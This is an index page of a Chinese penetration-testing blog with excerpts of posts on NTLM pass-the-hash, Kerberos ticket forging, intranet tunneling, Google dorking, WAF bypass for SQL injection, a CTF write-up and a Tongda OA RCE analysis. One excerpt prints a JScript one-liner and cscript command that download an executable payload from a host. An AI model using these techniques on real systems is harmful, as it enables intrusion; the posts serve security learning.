<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Zeo's Security Lab - Zeo Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="专注于安全,分享生活,分享知识">
<meta property="og:type" content="website">
<meta property="og:title" content="Zeo&#39;s Security Lab">
<meta property="og:url" content="https://godzeo.github.io/page/8/index.html">
<meta property="og:site_name" content="Zeo&#39;s Security Lab">
<meta property="og:description" content="专注于安全,分享生活,分享知识">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png">
<meta property="article:author" content="Zeo">
<meta property="article:tag" content="WEB安全">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="内网">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="二进制">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png"><link rel="shortcut icon" href="/img/WX20211124-162855.png"><link rel="canonical" href="https://godzeo.github.io/page/8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Zeo\'s Security Lab',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-02-15 22:09:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">130</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Zeo's Security Lab</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/" title="docker:打包正在运行的容器，快速拖环境跑路"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker:打包正在运行的容器，快速拖环境跑路"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/" title="docker:打包正在运行的容器，快速拖环境跑路">docker:打包正在运行的容器，快速拖环境跑路</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-22T08:54:15.000Z" title="发表于 2020-05-22 16:54:15">2020-05-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%85%8D%E7%8E%AF%E5%A2%83/">配环境</a></span></div><div class="content">

遇到了一个docker环境，需求带回来自己调试，所以记录大致流程docker:打包正在运行的容器，快速拖环境跑路
获取正在运行的容器1docker ps


找到ID 6996fffb6bfa
将容器打包成镜像1docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; 容器名称或id 打包的镜像名称:标签


拖到本地1docker save cnvd -o /Users/zy/Documents/source/sec.tar


导入镜像1docker load -i hackgod-demo.tar</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/" title="内网安全:NTML认证流程和PTH原理"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154662.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全:NTML认证流程和PTH原理"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/" title="内网安全:NTML认证流程和PTH原理">内网安全:NTML认证流程和PTH原理</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-14T05:41:28.000Z" title="发表于 2020-05-14 13:41:28">2020-05-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

NTML认证流程和PTH原理.

0x01 本地认证流程
0x02 网络认证

LM Hash和NTML Hash
NTLM Hash
NTLM V2协议


0x03 NTLM 认证
0x04 Pass The Hash （PTH）原理

主要作用：
前提：
原理：
使用方法：
绕过补丁，进行哈希传递





0x01 本地认证流程操作系统会显示登录界面，接收输入密码后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，和SAM数据库比较认证。

注：

winlogon.exe（Windows Logon Process），用于管理用户登录和退出。
LSASS用于微软Windows系统的安全机制，它用于本地安全和登陆策略。

0x02 网络认证在内网中，早期SMB协议在网络上传输明文口令。后来出现LM hash，很容易就被破解，现在又有了NTLM以及Kerberos。
LM Hash和NTML HashWindows操作系统中的密码由两部分加密组成，即LM Hash和NTML Hash。
NTLM Hash正常的明文密码加密为NTLM  ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" title="内网安全:Kerberos域认证流程---黄金票据和白银票据"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154568.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全:Kerberos域认证流程---黄金票据和白银票据"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" title="内网安全:Kerberos域认证流程---黄金票据和白银票据">内网安全:Kerberos域认证流程---黄金票据和白银票据</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-12T06:11:44.000Z" title="发表于 2020-05-12 14:11:44">2020-05-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

文章目录

0x00 前提
0x01 Kerberos域认证
域认证大致流程：
第一部分：生成TGT 和 session key
第二步：获取要访问的 server ticket
第三部 向客户端向服务器请求认证
0x01 白银票据(Silver Tickets)

伪造白银票据(Silver Tickets)


0x02 黄金票据（Golden Ticket）

伪造黄金票据


0x03 黄金票据和白银票据比较
0x04 参考



0x00 前提算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈
0x01 Kerberos域认证Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" title="网鼎杯 AreUSerialz反序列化题目"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152203945.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网鼎杯 AreUSerialz反序列化题目"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/" title="网鼎杯 AreUSerialz反序列化题目">网鼎杯 AreUSerialz反序列化题目</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-11T13:15:13.000Z" title="发表于 2020-05-11 21:15:13">2020-05-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">

看了网鼎杯 AreUSerialz反序列化题目wp对php的反序列化又有了学到了新的知识点，之前都没注意到
标题题目是这样的：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;   protected $op;   protected $filename;   protected $content;   function _ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" title="内网安全学习从入门到入狱-知识-内网隧道技术小结"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全学习从入门到入狱-知识-内网隧道技术小结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/05/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%B0%8F%E7%BB%93/" title="内网安全学习从入门到入狱-知识-内网隧道技术小结">内网安全学习从入门到入狱-知识-内网隧道技术小结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-05-06T02:49:39.000Z" title="发表于 2020-05-06 10:49:39">2020-05-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

文章目录
0x00 内网穿透技术
0x01 首先判断出网协议
0x02 各种协议隧道
网络层

ICMP隧道
Lcx


传输层

瑞士军刀：nc
Powercat（powershell版的nc）
推荐：netsh端口转发（window平台）


应用层

SSH转发：
SSH 本地转发机制：
SSH 远程转发机制：
SSH 动态转发机制：
HTTP HTTPS协议隧道
DNS 隧道：
Socks代理：
推荐使用
Nps
ew
Frp
Venom


0x03 总结

0x00 内网穿透技术当我们拿到一台内网主机后，一般都是有区域隔离的。
所以内网隧道技术，就是我们必须要掌握的。
我简单介绍一下建立通信隧道，常见的有端口转发等
主要隧道有：
ICMP TCP UDP
SSH HTTP DNS
SOCKS
0x01 首先判断出网协议icmp协议：
12ping 命令ping www.baidu.com

TCP协议：
12curl www.baidu.comnc IP

HTTP协议：
12curl ip:portcurl www.baidu.com:80

DNS协议：
12Nsl ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/" title="google hack搜索引擎常用总结"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152203945.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="google hack搜索引擎常用总结"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/" title="google hack搜索引擎常用总结">google hack搜索引擎常用总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-26T02:05:57.000Z" title="发表于 2020-04-26 10:05:57">2020-04-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

简介
在渗透测试中，利用搜索引擎信息收集还是很不错，常常有意外的收获，也可以用在一些镜像库里面搜索信息收集
还有之前看到的一些，都总结分享一下

主要的常用一些语法12345678910111213site：可以限制你搜索范围的域名inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)intitle: 查包含关键词的页面，一般用于社工别人的webshell密码filetype：搜索文件的后缀或者扩展名intitle：限制你搜索的网页标题.link: 可以得到一个所有包含了某个指定URL的页面列表.

实例查找后台地址：site域名
12这个真的好用查看某公司的表格找账户：site:域名 filetype:xlsx

1234567891011121314151617inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms查找文本内容：site:域名 intext:管理 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="一句话下载payload（持续更新）"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154494.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一句话下载payload（持续更新）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="一句话下载payload（持续更新）">一句话下载payload（持续更新）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-24T05:24:07.000Z" title="发表于 2020-04-24 13:24:07">2020-04-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">内网安全研究</a></span></div><div class="content">

js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。
12345678var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();​BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type = 1;​BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(&quot;micropoor.exe&quot;);

1C:\test&gt;cscript /nologo dowfile2.js http://192.168.1.1/eval.exe

还 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/" title="从绕过安全狗到编写tamper脚本"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152203945.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从绕过安全狗到编写tamper脚本"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/" title="从绕过安全狗到编写tamper脚本">从绕过安全狗到编写tamper脚本</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-21T01:23:23.000Z" title="发表于 2020-04-21 09:23:23">2020-04-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

文章目录
0x00 简述
0x01 首先我们要判断哪个关键字被拦截了
0x02 一些简单的知识点
0x03 总结安全狗拦截的点
0x04 Sqlmap tamper的编写
0x05 tamper主要的三个部分
0x06 tamper编写测试方法
0x07 结束

0x00 简述
安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的
但是实际情况是需要权衡可用性和安全性
当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截
所以最终就是正则的绕过
注意：
版本不同，他的正则规则也是不一样的
所以有的payload在新老版本是不能同吃。
但是没有关系，你学会这么绕，这都不是问题。

0x01 首先我们要判断哪个关键字被拦截了我们以 order by 3 这个简单的语句为例子
提供思路就是破坏单词去测试：
123456http://10.211.55.4/Less-2/?id=1 order by 3  （拦截）http://10.211.55.4/Less-2/?id=1 ordwer by 3 （破坏了order 没有拦截）http://10.211.55.4/Less-2/ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/" title="记一次360众测仿真实战靶场考核WP"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次360众测仿真实战靶场考核WP"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/" title="记一次360众测仿真实战靶场考核WP">记一次360众测仿真实战靶场考核WP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-04-06T03:08:31.000Z" title="发表于 2020-04-06 11:08:31">2020-04-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

0x00 考核主要分为两部分
第一部分为客观题：分为单选题，多选题，和判断题。
我记录了一道有趣的题，也是不清楚正确答案的群

第二部分为操作题：


0x01客观题我记录了一道有趣的题，也是不清楚正确答案，有大佬知道吗

0x02:操作题
源码分析题，给你源码提及一个数据


PHP &#x3D;&#x3D; 弱语言绕过 ，因为没弄过CTF也是印象比较深刻

网站被黑，可以下载整站，找后门

下载源码，找见后门webshell，看一眼，变形的一句话，连上

一个加密的一句话木马

就普通一句话各种decode

IP伪造登陆 X-FORWORD

只能客户端登陆

一个弹幕网站

进去发现是Struts2的，有工具一把梭

xxx系统的数据库系统。postgresql

识别出来是postgresql，但是连上了啥也没找到，没做出来。。。

一个登录框

点点发现有注入，sqlmap直接跑了

wireshark分析数据包的

有人改了数据库密码 找到修改的 数据库密码

wireshark分析数据包的

删除数据库记录的ip

wireshark分析数据包的

找上传者的ip
 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="通达OA任意文件上传/文件包含RCE漏洞分析"><img class="post_bg" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通达OA任意文件上传/文件包含RCE漏洞分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="通达OA任意文件上传/文件包含RCE漏洞分析">通达OA任意文件上传/文件包含RCE漏洞分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-03-30T02:06:34.000Z" title="发表于 2020-03-30 10:06:34">2020-03-30</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="content">

通达OA任意文件上传&#x2F;文件包含RCE漏洞分析
0x01 前提
0x01 漏洞介绍
0x02 漏洞分析

首先下载安装
绕过身份验证文件上传部分
变量传递问题
文件包含部分



0x01 前提关于这个漏洞的利用方式：
​
利用方式大致有两种：

包含日志文件。
绕过身份验证文件上传然后在文件包含。

下面主要分析第二种
0x01 漏洞介绍_通达OA_系统代表了协同OA的先进理念,16年研发铸就成熟OA产品,协同OA软件行业唯一央企团队研发,多次摘取国内OA软件金奖,拥有2万多家正式用户,8万多家免费版用户,超过…
主要危害：
攻击者可以在为登陆或者说，无任何条件触发漏洞，上传图片木马文件，请求进行文件包含最终可达成远程命令执行
影响版本：

V11版
2017版
2016版
2015版
2013版
2013增强版

0x02 漏洞分析我用的官网下载的V11.3
利用方式大致有两种：

包含日志文件。
绕过身份验证文件上传然后在文件包含。

下面我主要分析饶过权限上传，然后文件包含的方式：
首先下载安装打开源码一看，都加密了，使用zend进行了加密。
